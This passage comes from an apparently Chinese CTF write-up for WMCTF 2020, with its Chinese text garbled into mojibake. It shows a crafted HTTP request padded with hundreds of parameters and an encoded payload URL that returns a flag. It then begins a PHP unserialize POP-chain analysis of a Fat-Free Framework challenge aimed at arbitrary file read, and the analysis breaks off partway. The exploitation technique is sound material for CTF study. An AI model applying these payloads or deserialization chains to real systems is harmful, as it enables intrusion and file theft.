=&amp;fy=&amp;fz=&amp;fA=&amp;fB=&amp;fC=&amp;fD=&amp;fE=&amp;fF=&amp;fG=&amp;fH=&amp;fI=&amp;fJ=&amp;fK=&amp;fL=&amp;fM=&amp;fN=&amp;fO=&amp;fP=&amp;fQ=&amp;fR=&amp;fS=&amp;fT=&amp;fU=&amp;fV=&amp;fW=&amp;fX=&amp;fY=&amp;fZ=&amp;f0=&amp;f1=&amp;f2=&amp;f3=&amp;f4=&amp;f5=&amp;f6=&amp;f7=&amp;f8=&amp;f9=&amp;ga=&amp;gb=&amp;gc=&amp;gd=&amp;ge=&amp;gf=&amp;gg=&amp;gh=&amp;gi=&amp;gj=&amp;gk=&amp;gl=&amp;gm=&amp;gn=&amp;go=&amp;gp=&amp;gq=&amp;gr=&amp;gs=&amp;gt=&amp;gu=&amp;gv=&amp;gw=&amp;gx=&amp;gy=&amp;gz=&amp;gA=&amp;gB=&amp;gC=&amp;gD=&amp;gE=&amp;gF=&amp;gG=&amp;gH=&amp;gI=&amp;gJ=&amp;gK=&amp;gL=&amp;gM=&amp;gN=&amp;gO=&amp;gP=&amp;gQ=&amp;gR=&amp;gS=&amp;gT=&amp;gU=&amp;gV=&amp;gW=&amp;gX=&amp;gY=&amp;gZ=&amp;g0=&amp;g1=&amp;g2=&amp;g3=&amp;g4=&amp;g5=&amp;g6=&amp;g7=&amp;g8=&amp;g9=&amp;ha=&amp;hb=&amp;hc=&amp;hd=&amp;he=&amp;hf=&amp;hg=&amp;hh=&amp;hi=&amp;hj=&amp;hk=&amp;hl=&amp;hm=&amp;hn=&amp;ho=&amp;hp=&amp;hq=&amp;hr=&amp;hs=&amp;ht=&amp;hu=&amp;hv=&amp;hw=&amp;hx=&amp;hy=&amp;hz=&amp;hA=&amp;hB=&amp;hC=&amp;hD=&amp;hE=&amp;hF=&amp;hG=&amp;hH=&amp;hI=&amp;hJ=&amp;hK=&amp;hL=&amp;hM=&amp;hN=&amp;hO=&amp;hP=&amp;hQ=&amp;hR=&amp;hS=&amp;hT=&amp;hU=&amp;hV=&amp;hW=&amp;hX=&amp;hY=&amp;hZ=&amp;h0=&amp;h1=&amp;h2=&amp;h3=&amp;h4=&amp;h5=&amp;h6=&amp;h7=&amp;h8=&amp;h9=&amp;ia=&amp;ib=&amp;ic=&amp;id=&amp;ie=&amp;if=&amp;ig=&amp;ih=&amp;ii=&amp;ij=&amp;ik=&amp;il=&amp;im=&amp;in=&amp;io=&amp;ip=&amp;iq=&amp;ir=&amp;is=&amp;it=&amp;iu=&amp;iv=&amp;iw=&amp;ix=&amp;iy=&amp;iz=&amp;iA=&amp;iB=&amp;iC=&amp;iD=&amp;iE=&amp;iF=&amp;iG=&amp;iH=&amp;iI=&amp;iJ=&amp;iK=&amp;iL=&amp;iM=&amp;iN=&amp;iO=&amp;iP=&amp;iQ=&amp;iR=&amp;iS=&amp;iT=&amp;iU=&amp;iV=&amp;iW=&amp;iX=&amp;iY=&amp;iZ=&amp;i0=&amp;i1=&amp;i2=&amp;i3=&amp;i4=&amp;i5=&amp;i6=&amp;i7=&amp;i8=&amp;i9=&amp;ja=&amp;jb=&amp;jc=&amp;jd=&amp;je=&amp;jf=&amp;jg=&amp;jh=&amp;ji=&amp;jj=&amp;jk=&amp;jl=&amp;jm=&amp;jn=&amp;jo=&amp;jp=&amp;jq=&amp;jr=&amp;js=&amp;jt=&amp;ju=&amp;jv=&amp;jw=&amp;jx=&amp;jy=&amp;jz=&amp;jA=&amp;jB=&amp;jC=&amp;jD=&amp;jE=&amp;jF=&amp;jG=&amp;jH=&amp;jI=&amp;jJ=&amp;jK=&amp;jL=&amp;jM=&amp;jN=&amp;jO=&amp;jP=&amp;jQ=&amp;jR=&amp;jS=&amp;jT=&amp;jU=&amp;jV=&amp;jW=&amp;jX=&amp;jY=&amp;jZ=&amp;j0=&amp;j1=&amp;j2=&amp;j3=&amp;j4=&amp;j5=&amp;j6=&amp;j7=&amp;j8=&amp;j9=&amp;ka=&amp;kb=&amp;kc=&amp;kd=&amp;ke=&amp;kf=&amp;kg=&amp;kh=&amp;ki=&amp;kj=&amp;kk=&amp;kl=&amp;km=&amp;kn=&amp;ko=&amp;kp=&amp;kq=&amp;kr=&amp;ks=&amp;kt=&amp;ku=&amp;kv=&amp;kw=&amp;kx=&amp;ky=&amp;kz=&amp;kA=&amp;kB=&amp;kC=&amp;kD=&amp;kE=&amp;kF=&amp;kG=&amp;kH=&amp;kI=&amp;kJ=&amp;kK=&amp;kL=&amp;kM=&amp;kN=&amp;kO=&amp;kP=&amp;kQ=&amp;kR=&amp;kS=&amp;kT=&amp;kU=&amp;kV=&amp;kW=&amp;kX=&amp;kY=&amp;kZ=&amp;k0=&amp;k1=&amp;k2=&amp;k3=&amp;k4=&amp;k5=&amp;k6=&amp;k7=&amp;k8=&amp;k9=&amp;la=&amp;lb=&amp;lc=&amp;ld=&amp;le=&amp;lf=&amp;lg=&amp;lh=&amp;li=&amp;lj=&amp;lk=&amp;ll=&amp;lm=&amp;ln=&amp;lo=&amp;lp=&amp;lq=&amp;lr=&amp;ls=&amp;lt=&amp;lu=&amp;lv=&amp;lw=&amp;lx=&amp;ly=&amp;lz=&amp;lA=&amp;lB=&amp;lC=&amp;lD=&amp;lE=&amp;lF=&amp;lG=&amp;lH=&amp;lI=&amp;lJ=&amp;lK=&amp;lL=&amp;lM=&amp;lN=&amp;lO=&amp;lP=&amp;lQ=&amp;lR=&amp;lS=&amp;lT=&amp;lU=&amp;lV=&amp;lW=&amp;lX=&amp;lY=&amp;lZ=&amp;l0=&amp;l1=&amp;l2=&amp;l3=&amp;l4=&amp;l5=&amp;l6=&amp;l7=&amp;l8=&amp;l9=&amp;ma=&amp;mb=&amp;mc=&amp;md=&amp;me=&amp;mf=&amp;mg=&amp;mh=&amp;mi=&amp;mj=&amp;mk=&amp;ml=&amp;mm=&amp;mn=&amp;mo=&amp;mp=&amp;mq=&amp;mr=&amp;ms=&amp;mt=&amp;mu=&amp;mv=&amp;mw=&amp;mx=&amp;my=&amp;mz=&amp;mA=&amp;mB=&amp;mC=&amp;mD=&amp;mE=&amp;mF=&amp;mG=&amp;mH=&amp;mI=&amp;mJ=&amp;mK=&amp;mL=&amp;mM=&amp;mN=&amp;mO=&amp;mP=&amp;mQ=&amp;mR=&amp;mS=&amp;mT=&amp;mU=&amp;mV=&amp;mW=&amp;mX=&amp;mY=&amp;mZ=&amp;m0=&amp;m1=&amp;m2=&amp;m3=&amp;m4=&amp;m5=&amp;m6=&amp;m7=&amp;m8=&amp;m9=&amp;na=&amp;nb=&amp;nc=&amp;nd=&amp;ne=&amp;nf=&amp;ng=&amp;nh=&amp;ni=&amp;nj=&amp;nk=&amp;nl=&amp;nm=&amp;nn=&amp;no=&amp;np=&amp;nq=&amp;nr=&amp;ns=&amp;nt=&amp;nu=&amp;nv=&amp;nw=&amp;nx=&amp;ny=&amp;nz=&amp;nA=&amp;nB=&amp;nC=&amp;nD=&amp;nE=&amp;nF=&amp;nG=&amp;nH=&amp;nI=&amp;nJ=&amp;nK=&amp;nL=&amp;nM=&amp;nN=&amp;nO=&amp;nP=&amp;nQ=&amp;nR=&amp;nS=&amp;nT=&amp;nU=&amp;nV=&amp;nW=&amp;nX=&amp;nY=&amp;nZ=&amp;n0=&amp;n1=&amp;n2=&amp;n3=&amp;n4=&amp;n5=&amp;n6=&amp;n7=&amp;n8=&amp;n9=&amp;oa=&amp;ob=&amp;oc=&amp;od=&amp;oe=&amp;of=&amp;og=&amp;oh=&amp;oi=&amp;oj=&amp;ok=&amp;ol=&amp;om=&amp;on=&amp;oo=&amp;op=&amp;oq=&amp;or=&amp;os=&amp;ot=&amp;ou=&amp;ov=&amp;ow=&amp;ox=&amp;oy=&amp;oz=&amp;oA=&amp;oB=&amp;oC=&amp;oD=&amp;oE=&amp;oF=&amp;oG=&amp;oH=&amp;oI=&amp;oJ=&amp;oK=&amp;oL=&amp;oM=&amp;oN=&amp;oO=&amp;oP=&amp;oQ=&amp;oR=&amp;oS=&amp;oT=&amp;oU=&amp;oV=&amp;oW=&amp;oX=&amp;oY=&amp;oZ=&amp;o0=&amp;o1=&amp;o2=&amp;o3=&amp;o4=&amp;o5=&amp;o6=&amp;o7=&amp;o8=&amp;o9=&amp;pa=&amp;pb=&amp;pc=&amp;pd=&amp;pe=&amp;pf=&amp;pg=&amp;ph=&amp;pi=&amp;pj=&amp;pk=&amp;pl=&amp;pm=&amp;pn=&amp;po=&amp;pp=&amp;pq=&amp;pr=&amp;ps=&amp;pt=&amp;pu=&amp;pv=&amp;pw=&amp;px=&amp;py=&amp;pz=&amp;pA=&amp;pB=&amp;pC=&amp;pD=&amp;pE=&amp;pF=&amp;pG=&amp;pH=&amp;pI=&amp;pJ=&amp;pK=&amp;pL=&amp;pM=&amp;pN=&amp;pO=&amp;pP=&amp;pQ=&amp;pR=&amp;pS=&amp;pT=&amp;pU=&amp;pV=&amp;pW=&amp;pX=&amp;pY=&amp;pZ=&amp;p0=&amp;p1=&amp;p2=&amp;p3=&amp;p4=&amp;p5=&amp;p6=&amp;p7=&amp;p8=&amp;p9=&amp;qa=&amp;qb=&amp;qc=&amp;qd=&amp;qe=&amp;qf=&amp;qg=&amp;qh=&amp;qi=&amp;qj=&amp;qk=&amp;ql=&amp;qm=&amp;qn=&amp;qo=&amp;qp=&amp;qq=&amp;qr=&amp;qs=&amp;qt=&amp;qu=&amp;qv=&amp;qw=&amp;qx=&amp;qy=&amp;qz=&amp;qA=&amp;qB=&amp;qC=&amp;qD=&amp;qE=&amp;qF=&amp;qG=&amp;qH=&amp;qI=&amp;qJ=&amp;qK=&amp;qL=&amp;qM=&amp;qN=&amp;qO=&amp;qP=&amp;qQ=&amp;qR=&amp;qS=&amp;qT=&amp;qU=&amp;qV=&amp;qW=&amp;qX=&amp;qY=&amp;qZ=&amp;q0=&amp;q1=&amp;q2=&amp;q3=&amp;q4=&amp;q5=&amp;q6=&amp;q7=&amp;q8=&amp;q9=&amp;ra=&amp;rb=&amp;rc=&amp;rd=&amp;re=&amp;rf=&amp;rg=&amp;rh=&amp;ri=&amp;rj=&amp;rk=&amp;rl=&amp;rm=&amp;rn=&amp;ro=&amp;rp=&amp;rq=&amp;rr=&amp;rs=&amp;rt=&amp;ru=&amp;rv=&amp;rw=&amp;rx=&amp;ry=&amp;rz=&amp;rA=&amp;rB=&amp;rC=&amp;rD=&amp;rE=&amp;rF=&amp;rG=&amp;rH=&amp;rI=&amp;rJ=&amp;rK=&amp;rL=&amp;rM=&amp;rN=&amp;rO=&amp;rP=&amp;rQ=&amp;rR=&amp;rS=&amp;rT=&amp;rU=&amp;rV=&amp;rW=&amp;rX=&amp;rY=&amp;rZ=&amp;r0=&amp;r1=&amp;r2=&amp;r3=&amp;r4=&amp;r5=&amp;r6=&amp;r7=&amp;r8=&amp;r9=&amp;sa=&amp;sb=&amp;sc=&amp;sd=&amp;se=&amp;sf=&amp;sg=&amp;sh=&amp;si=&amp;sj=&amp;sk=&amp;sl=&amp;sm=&amp;sn=&amp;so=&amp;sp=&amp;sq=&amp;sr=&amp;ss=&amp;st=&amp;su=&amp;sv=&amp;sw=&amp;sx=&amp;sy=&amp;sz=&amp;sA=&amp;sB=&amp;sC=&amp;sD=&amp;sE=&amp;sF=&amp;sG=&amp;sH=&amp;sI=&amp;sJ=&amp;sK=&amp;sL=&amp;sM=&amp;sN=&amp;sO=&amp;sP=&amp;sQ=&amp;sR=&amp;sS=&amp;sT=&amp;sU=&amp;sV=&amp;sW=&amp;sX=&amp;sY=&amp;sZ=&amp;s0=&amp;s1=&amp;s2=&amp;s3=&amp;s4=&amp;s5=&amp;s6=&amp;s7=&amp;s8=&amp;s9=&amp;ta=&amp;tb=&amp;tc=&amp;td=&amp;te=&amp;tf=&amp;tg=&amp;th=&amp;ti=&amp;tj=&amp;tk=&amp;tl=&amp;tm=&amp;tn=&amp;to=&amp;tp=&amp;tq=&amp;tr=&amp;ts=&amp;tt=&amp;tu=&amp;tv=&amp;tw=&amp;tx=&amp;ty=&amp;tz=&amp;tA=&amp;tB=&amp;tC=&amp;tD=&amp;tE=&amp;tF=&amp;tG=&amp;tH=&amp;tI=&amp;tJ=&amp;tK=&amp;tL=&amp;tM=&amp;tN=&amp;tO=&amp;tP=&amp;tQ=&amp;tR=&amp;tS=&amp;tT=&amp;tU=&amp;tV=&amp;tW=&amp;tX=&amp;tY=&amp;tZ=&amp;t0=&amp;t1=&amp;t2=&amp;t3=&amp;t4=&amp;t5=&amp;t6=&amp;t7=&amp;t8=&amp;t9=&amp;ua=&amp;ub=&amp;uc=&amp;ud=&amp;ue=&amp;uf=&amp;ug=&amp;uh=&amp;ui=&amp;uj=&amp;uk=&amp;ul=&amp;um=&amp;un=&amp;uo=&amp;up=&amp;uq=&amp;ur=&amp;us=&amp;ut=&amp;uu=&amp;uv=&amp;uw=&amp;ux=&amp;uy=&amp;uz=&amp;uA=&amp;uB=&amp;uC=&amp;uD=&amp;uE=&amp;uF=&amp;uG=&amp;uH=&amp;uI=&amp;uJ=&amp;uK=&amp;uL=&amp;uM=&amp;uN=&amp;uO=&amp;uP=&amp;uQ=&amp;uR=&amp;uS=&amp;uT=&amp;uU=&amp;uV=&amp;uW=&amp;uX=&amp;uY=&amp;uZ=&amp;u0=&amp;u1=&amp;u2=&amp;u3=&amp;u4=&amp;u5=&amp;u6=&amp;u7=&amp;u8=&amp;u9=&amp;va=&amp;vb=&amp;vc=&amp;vd=&amp;ve=&amp;vf=&amp;vg=&amp;vh=&amp;vi=&amp;vj=&amp;vk=&amp;vl=&amp;vm=&amp;vn=&amp;vo=&amp;vp=&amp;vq=&amp;vr=&amp;vs=&amp;vt=&amp;vu=&amp;vv=&amp;vw=&amp;vx=&amp;vy=&amp;vz=&amp;vA=&amp;vB=&amp;vC=&amp;vD=&amp;vE=&amp;vF=&amp;vG=&amp;vH=&amp;vI=&amp;vJ=&amp;vK=&amp;vL=&amp;vM=&amp;vN=&amp;vO=&amp;vP=&amp;vQ=&amp;vR=&amp;vS=&amp;vT=&amp;vU=&amp;vV=&amp;vW=&amp;vX=&amp;vY=&amp;vZ=&amp;v0=&amp;v1=&amp;v2=&amp;v3=&amp;v4=&amp;v5=&amp;v6=&amp;v7=&amp;v8=&amp;v9=&amp;wa=&amp;wb=&amp;wc=&amp;wd=&amp;we=&amp;wf=&amp;wg=&amp;wh=&amp;wi=&amp;wj=&amp;wk=&amp;wl=&amp;wm=&amp;wn=&amp;wo=&amp;wp=&amp;wq=&amp;wr=&amp;ws=&amp;wt=&amp;wu=&amp;wv=&amp;ww=&amp;wx=&amp;wy=&amp;wz=&amp;wA=&amp;wB=&amp;wC=&amp;wD=&amp;wE=&amp;wF=&amp;wG=&amp;wH=&amp;wI=&amp;wJ=&amp;wK=&amp;wL=&amp;wM=&amp;wN=&amp;wO=&amp;wP=&amp;wQ=&amp;wR=&amp;wS=&amp;wT=&amp;wU=&amp;wV=&amp;wW=&amp;wX=&amp;wY=&amp;wZ=&amp;w0=&amp;w1=&amp;w2=&amp;w3=&amp;w4=&amp;w5=&amp;w6=&amp;w7=&amp;w8=&amp;w9=&amp;xa=&amp;xb=&amp;xc=&amp;xd=&amp;xe=&amp;xf=&amp;xg=&amp;xh=&amp;xi=&amp;xj=&amp;xk=&amp;xl=&amp;xm=&amp;xn=&amp;xo=&amp;xp=&amp;xq=&amp;xr=&amp;xs=&amp;xt=&amp;xu=&amp;xv=&amp;xw=&amp;xx=&amp;xy=&amp;xz=&amp;xA=&amp;xB=&amp;xC=&amp;xD=&amp;xE=&amp;xF=&amp;xG=&amp;xH=&amp;xI=&amp;xJ=&amp;xK=&amp;xL=&amp;xM=&amp;xN=&amp;xO=&amp;xP=&amp;xQ=&amp;xR=&amp;xS=&amp;xT=&amp;xU=&amp;xV=&amp;xW=&amp;xX=&amp;xY=&amp;xZ=&amp;x0=&amp;x1=&amp;x2=&amp;x3=&amp;x4=&amp;x5=&amp;x6=&amp;x7=&amp;x8=&amp;x9=&amp;ya=&amp;yb=&amp;yc=&amp;yd=&amp;ye=&amp;yf=&amp;yg=&amp;yh=&amp;yi=&amp;yj=&amp;yk=&amp;yl=&amp;ym=&amp;yn=&amp;yo=&amp;yp=&amp;yq=&amp;yr=&amp;ys=&amp;yt=&amp;yu=&amp;yv=&amp;yw=&amp;yx=&amp;yy=&amp;yz=&amp;yA=&amp;yB=&amp;yC=&amp;yD=&amp;yE=&amp;yF=&amp;yG=&amp;yH=&amp;yI=&amp;yJ=&amp;yK=&amp;yL=&amp;yM=&amp;yN=&amp;yO=&amp;yP=&amp;yQ=&amp;yR=&amp;yS=&amp;yT=&amp;yU=&amp;yV=&amp;yW=&amp;yX=&amp;yY=&amp;yZ=&amp;y0=&amp;y1=&amp;y2=&amp;y3=&amp;y4=&amp;y5=&amp;y6=&amp;y7=&amp;y8=&amp;y9=&amp;za=&amp;zb=&amp;zc=&amp;zd=&amp;ze=&amp;zf=&amp;zg=&amp;zh=&amp;zi=&amp;zj=&amp;zk=&amp;zl=&amp;zm=&amp;zn=&amp;zo=&amp;zp=&amp;zq=&amp;zr=&amp;zs=&amp;zt=&amp;zu=&amp;zv=&amp;zw=&amp;zx=&amp;zy=&amp;zz=&amp;zA=&amp;zB=&amp;zC=&amp;zD=&amp;zE=&amp;zF=&amp;zG=&amp;zH=&amp;zI=&amp;zJ=&amp;zK=&amp;zL=&amp;zM=&amp;zN=&amp;zO=&amp;zP=&amp;zQ=&amp;zR=&amp;zS=&amp;zT=&amp;zU=&amp;zV=&amp;zW=&amp;zX=&amp;zY=&amp;zZ=&amp;z0=&amp;z1=&amp;z2=&amp;z3=&amp;z4=&amp;z5=&amp;z6=&amp;z7=&amp;z8=&amp;z9=&amp;Aa=&amp;Ab=&amp;Ac=&amp;Ad=&amp;Ae=&amp;Af=&amp;Ag=&amp;Ah=&amp;Ai=&amp;Aj=&amp;Ak=&amp;Al=&amp;Am=&amp;An=&amp;Ao=&amp;Ap=&amp;Aq=&amp;Ar=&amp;As=&amp;At=&amp;Au=&amp;Av=&amp;Aw=&amp;Ax=&amp;Ay=&amp;Az=&amp;AA=&amp;AB=&amp;AC=&amp;AD=&amp;AE=&amp;AF=&amp;AG=&amp;AH=&amp;AI=&amp;AJ=&amp;AK=&amp;AL=&amp;AM=&amp;AN=&amp;AO=&amp;AP=&amp;AQ=&amp;AR=&amp;AS=&amp;AT=&amp;AU=&amp;AV=&amp;AW=&amp;AX=&amp;AY=&amp;AZ=&amp;A0=&amp;A1=&amp;A2=&amp;A3=&amp;A4=&amp;A5=&amp;A6=&amp;A7=&amp;A8=&amp;A9=&amp;Ba=&amp;Bb=&amp;Bc=&amp;Bd=&amp;Be=&amp;Bf=&amp;Bg=&amp;Bh=&amp;Bi=&amp;Bj=&amp;Bk=&amp;Bl=&amp;Bm=&amp;Bn=&amp;Bo=&amp;Bp=&amp;Bq=&amp;Br=&amp;Bs=&amp;Bt=&amp;Bu=&amp;Bv=&amp;Bw=&amp;Bx=&amp;By=&amp;Bz=&amp;BA=&amp;BB=&amp;BC=&amp;BD=&amp;BE=&amp;BF=&amp;BG=&amp;BH=&amp;BI=&amp;BJ=&amp;BK=&amp;BL=&amp;BM=&amp;BN=&amp;BO=&amp;BP=&amp;BQ=&amp;BR=&amp;BS=&amp;BT=&amp;BU=&amp;BV=&amp;BW=&amp;BX=&amp;BY=&amp;BZ=&amp;B0=&amp;B1=&amp;B2=&amp;B3=&amp;B4=&amp;B5=&amp;B6=&amp;B7=&amp;B8=&amp;B9=&amp;Ca=&amp;Cb=&amp;Cc=&amp;Cd=&amp;Ce=&amp;Cf=&amp;Cg=&amp;Ch=&amp;Ci=&amp;Cj=&amp;Ck=&amp;Cl=&amp;Cm=&amp;Cn=&amp;Co=&amp;Cp=&amp;Cq=&amp;Cr=&amp;Cs=&amp;Ct=&amp;Cu=&amp;Cv=&amp;Cw=&amp;Cx=&amp;Cy=&amp;Cz=&amp;CA=&amp;CB=&amp;CC=&amp;CD=&amp;CE=&amp;CF=&amp;CG=&amp;CH=&amp;CI=&amp;CJ=&amp;CK=&amp;CL=&amp;CM=&amp;CN=&amp;CO=&amp;CP=&amp;CQ=&amp;CR=&amp;CS=&amp;CT=&amp;CU=&amp;CV=&amp;CW=&amp;CX=&amp;CY=&amp;CZ=&amp;C0=&amp;C1=&amp;C2=&amp;C3=&amp;C4=&amp;C5=&amp;C6=&amp;C7=&amp;C8=&amp;C9=&amp;Da=&amp;Db=&amp;Dc=&amp;Dd=&amp;De=&amp;Df=&amp;Dg=&amp;Dh=&amp;Di=&amp;Dj=&amp;Dk=&amp;Dl=&amp;Dm=&amp;Dn=&amp;Do=&amp;Dp=&amp;Dq=&amp;Dr=&amp;Ds=&amp;Dt=&amp;Du=&amp;Dv=&amp;Dw=&amp;Dx=&amp;Dy=&amp;Dz=&amp;DA=&amp;DB=&amp;DC=&amp;DD=&amp;DE=&amp;DF=&amp;DG=&amp;DH=&amp;DI=&amp;DJ=&amp;DK=&amp;DL=&amp;DM=&amp;DN=&amp;DO=&amp;DP=&amp;DQ=&amp;DR=&amp;DS=&amp;DT=&amp;DU=&amp;DV=&amp;DW=&amp;DX=&amp;DY=&amp;DZ=&amp;D0=&amp;D1=&amp;D2=&amp;D3=&amp;D4=&amp;D5=&amp;D6=&amp;D7=&amp;D8=&amp;D9=&amp;Ea=&amp;Eb=&amp;Ec=&amp;Ed=&amp;Ee=&amp;Ef=&amp;Eg=&amp;Eh=&amp;Ei=&amp;Ej=&amp;Ek=&amp;El=&amp;Em=&amp;En=&amp;Eo=&amp;Ep=&amp;Eq=&amp;Er=&amp;Es=&amp;Et=&amp;Eu=&amp;Ev=&amp;Ew=&amp;Ex=&amp;Ey=&amp;Ez=&amp;EA=&amp;EB=&amp;EC=&amp;ED=&amp;EE=&amp;EF=&amp;EG=&amp;EH=&amp;EI=&amp;EJ=&amp;EK=&amp;EL=&amp;EM=&amp;EN= HTTP/1.1</span><br><span class="line">Host: web_checkin2.wmctf.wetolink.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•å‘ç°ï¼Œå°±å¦‚æˆ‘ä»¬çŒœæƒ³çš„ä¸€æ ·ã€‚</p>
<p>è®¿é—®<code>http://web_checkin2.wmctf.wetolink.com/?content=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</code><br>æ‹¿åˆ°flag:<code>WMCTF&#123;3C5E9715-5BEE-4D33-8627-DE10E5D92715&#125;</code></p>
<h2 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a>webweb</h2><p>è¿™é¢˜æœ¬åœ°æµ‹è¯•æˆåŠŸè¿œç¨‹ä¸è¡Œï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œé™ç­‰å…¶ä»–äººçš„wp</p>
<p>ä»£ç å¾ˆç®€å•ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">	trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line"><span class="variable">$f3</span>-&gt;config(<span class="string">&#x27;config.ini&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;route(<span class="string">&#x27;GET /&#x27;</span>,</span><br><span class="line">	<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$f3</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;just get me a,don&#x27;t do anything else&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">);</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><p>åˆæ˜¯ä¸€é¢˜ååºåˆ—åŒ–</p>
<p>è€è§„çŸ©å¼€å±€æ‰¾å…¥å£ç‚¹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804104714.png" alt="image11496"></p>
<p>è¿™é‡Œåªæœ‰è¿™ä¸€ä¸ªå…¥å£ç‚¹ï¼Œè¿™ä¸ªå…¥å£ç‚¹è¿˜æŒºä¸é”™çš„ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘è°ƒç”¨é­”æœ¯æ–¹æ³•æˆ–è€…æ˜¯åˆ©ç”¨<code>$func($this)</code>æ¥æ„é€ ä¸‹ä¸€æ­¥</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•æœ‰ï¼š<code>__get</code>å’Œ<code>__call</code>ï¼Œæ‰¾äº†ä¸€æ³¢æ²¡å•¥å¥½ç”¨çš„é­”æœ¯æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åˆ©ç”¨<code>$func($this)</code>å§</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æœ‰ä¸¤ç§æ€è·¯ï¼š</p>
<ol>
<li>æ‰©å®½é“è·¯ï¼Œå°±æ˜¯æ‰¾ä¸€ä¸ªå‡½æ•°ï¼Œé‡Œé¢è°ƒç”¨æœ‰æ„æ€çš„æ–¹æ³•çš„</li>
<li>ç¡®å®špopé“¾å°¾</li>
</ol>
<p>æˆ‘è¿™é‡Œæ˜¯å…ˆæ‰©å®½ååºåˆ—åŒ–çš„é“è·¯å†å»æ‰¾é“¾å°¾çš„ï¼Œæ¯•ç«Ÿå¯ä»¥å½“é“¾å°¾çš„å¤ªå¤šäº†</p>
<p>æ…¢æ…¢æ‰¾è¿‡å»å‘ç°ä¸€ä¸ªæœ‰æ„æ€çš„æ–¹æ³•</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804105340.png" alt="image11818"></p>
<p>è¿™é‡Œå¯ä»¥è°ƒç”¨:<code>$func($url,false,true)</code>ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶<code>$url</code>é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½èˆ’æœå¤šäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾ä¸ªå¯ä»¥æ§åˆ¶<code>$url</code>çš„åœ°æ–¹</p>
<p>æ‰¾ç€æ‰¾ç€å‘ç°äº†<code>Base::run</code>è¿™ä¸ªæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç›´æ¥åˆ©ç”¨<code>$func($this);</code>æ¥è°ƒç”¨å®ƒï¼ˆå¯¹äºç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°/æ–¹æ³•ï¼Œå¤šä¸€äº›å‚æ•°æ²¡å•¥å½±å“ï¼Œä½†æ˜¯å¯¹å¤§éƒ¨åˆ†è‡ªå¸¦çš„å‡½æ•°å°±ä¸è¡Œäº†ï¼ŒåŸå› ä¼°è®¡æ˜¯è‡ªå¸¦çš„å‡½æ•°éƒ½æ˜¯cç¼–å†™çš„å›ºå®šå‚æ•°çš„å‡½æ•°ï¼‰ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹å®ƒè°ƒç”¨<code>reroute</code>çš„åœ°æ–¹</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110131.png" alt="image12152"></p>
